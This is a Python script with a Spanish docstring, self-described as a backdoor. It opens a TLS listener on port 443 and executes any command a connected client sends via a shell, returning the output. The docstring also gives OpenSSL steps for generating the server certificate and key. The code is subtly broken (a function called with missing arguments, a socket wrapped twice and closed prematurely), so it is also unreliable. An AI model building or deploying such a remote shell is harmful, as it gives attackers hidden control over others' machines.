import ssl
import socket
import subprocess
import os

"""
Esta función authenticate_client realiza los siguientes pasos:
Crea un contexto SSL/TLS utilizando el protocolo TLS más reciente.
Carga el certificado de la Autoridad de Certificación (CA) de confianza desde el archivo ca_cert_file.
Carga el certificado y la clave privada del servidor desde los archivos server_cert_file y server_key_file, 
respectivamente.
Configura el modo de verificación para requerir la autenticación mutua (cliente y servidor).
Envuelve el socket del cliente con el contexto SSL/TLS.
Realiza el apretón de manos SSL/TLS (do_handshake()).
Verifica el certificado del cliente (getpeercert()).
Verifica el certificado del servidor (getpeercert(binary_form=True) y add_cert()).
Si ambos certificados son válidos, la autenticación es exitosa y se devuelve True.
En caso de error SSL/TLS, se imprime el error y se devuelve False.
Finalmente, se cierra el socket SSL/TLS.

Para utilizar esta función, debes tener los siguientes archivos:
ca_cert_file: El archivo que contiene el certificado de la Autoridad de Certificación (CA) de confianza.
server_cert_file: El archivo que contiene el certificado del servidor emitido por la CA.
server_key_file: El archivo que contiene la clave privada del servidor.
Además, el cliente también debe tener un certificado emitido por la misma CA de confianza.
Esta implementación de autenticación mutua basada en certificados digitales es mucho más segura que utilizar 
contraseñas hardcodeadas, ya que los certificados son emitidos y verificados por una Autoridad de 
Certificación confiable. 
Tanto el cliente como el servidor deben presentar certificados válidos para establecer una conexión segura.

Los archivos server.crt y server.key son archivos de certificado y clave privada utilizados para establecer una conexión 
SSL/TLS segura. 
Estos archivos se pueden generar utilizando herramientas como OpenSSL o mediante una Autoridad de Certificación (CA).
En cuanto a la contraseña hardcodeada "secret", es una práctica extremadamente insegura y no recomendada. 
En su lugar, se debe utilizar una contraseña segura y aleatoria, o mejor aún, implementar un mecanismo de autenticación 
más robusto, como la autenticación basada en certificados.
Aquí hay un ejemplo de cómo generar los archivos server.crt y server.key utilizando OpenSSL en un sistema Unix/Linux:

```
Generar una clave privada:
    openssl genrsa -out server.key 2048
```

Este comando generará un archivo server.key con una clave privada RSA de 2048 bits.

```
Generar una solicitud de firma de certificado (CSR):
    openssl req -new -key server.key -out server.csr
```

Este comando te pedirá que ingreses información como el país, estado, localidad, organización, etc. 
Puedes ingresar la información que desees, ya que este certificado es solo para fines de prueba.

```
Generar un certificado autofirmado:

    openssl x509 -req -days 365 -in server.csr -signkey server.key -out server.crt
```

Este comando generará un certificado autofirmado válido por 365 días en el archivo server.crt.
Después de generar estos archivos, debes asegurarte de proteger la clave privada (server.key) 
y no compartirla con nadie. 

El archivo server.crt es el certificado público y se puede distribuir a los clientes que necesiten verificar la 
identidad del servidor.

En cuanto a la contraseña hardcodeada "secret", debes reemplazarla por un mecanismo de autenticación más seguro. 
Por ejemplo, puedes implementar la autenticación basada en certificados, donde el cliente y el servidor se autentican 
mutuamente utilizando certificados digitales.

Es importante tener en cuenta que este código es una puerta trasera y, por lo tanto, no debe ser utilizado en un 
entorno de producción real. 

Este tipo de código puede ser utilizado con fines maliciosos y, por lo tanto, debe ser tratado con extrema precaución y 
solo con fines de investigación y análisis de seguridad.

"""


def authenticate_client(client_socket, ca_cert_file, server_cert_file, server_key_file):
    # Crear un contexto SSL/TLS
    ssl_context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)

    # Cargar el certificado de la CA de confianza
    ssl_context.load_verify_locations(cafile=ca_cert_file)

    # Cargar el certificado y la clave privada del servidor
    ssl_context.load_cert_chain(certfile=server_cert_file, keyfile=server_key_file)

    # Configurar la autenticación mutua (cliente y servidor)
    ssl_context.verify_mode = ssl.CERT_REQUIRED

    # Envolver el socket con el contexto SSL/TLS
    ssl_socket = ssl_context.wrap_socket(client_socket, server_side=True)

    try:
        # Realizar el apretón de manos SSL/TLS
        ssl_socket.do_handshake()

        # Verificar el certificado del cliente
        client_cert = ssl_socket.getpeercert()
        if client_cert is None:
            print("El cliente no presentó un certificado válido.")
            return False

        # Verificar el certificado del servidor
        server_cert = ssl_socket.getpeercert(binary_form=True)
        ssl_context.get_cert_store().add_cert(server_cert)

        # Si ambos certificados son válidos, la autenticación es exitosa
        return True

    except ssl.SSLError as e:
        print(f"Error de SSL/TLS: {str(e)}")
        return False

    finally:
        ssl_socket.close()


def execute_command(command):
    return subprocess.check_output(command, shell=True)


def backdoor():
    # Crear un contexto SSL/TLS
    ssl_context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
    ssl_context.load_cert_chain(certfile="server.crt", keyfile="server.key")

    # Crear un socket TCP
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server_socket.bind(("0.0.0.0", 443))
    server_socket.listen(5)

    print("Server is listening on port 443...")

    while True:
        client_socket, addr = server_socket.accept()
        print(f"Incoming connection from {addr}")

        # Envolver el socket con el contexto SSL/TLS
        ssl_socket = ssl_context.wrap_socket(client_socket, server_side=True)

        if authenticate_client(ssl_socket):
            print(f"Connection from {addr} is authenticated.")
            print("Type 'exit' to exit the backdoor.")

            try:
                while True:
                    command = ssl_socket.recv(1024).decode()
                    if command.lower() == "exit":
                        ssl_socket.close()
                        print("bye!")
                        break
                    else:
                        output = execute_command(command)
                        ssl_socket.sendall(output)
            except Exception as e:
                print(f"Error: {e}")
        else:
            print(f"Connection from {addr} is not authenticated.")

        ssl_socket.close()


if __name__ == "__main__":
    # Verificar si los archivos de certificado y clave existen
    if not os.path.exists("server.crt") or not os.path.exists("server.key"):
        print(
            "Los archivos 'server.crt' y 'server.key' son necesarios para ejecutar este script."
        )
        print(
            "Por favor, proporciona estos archivos o genera un nuevo par de certificado/clave."
        )
        exit(1)

    backdoor()
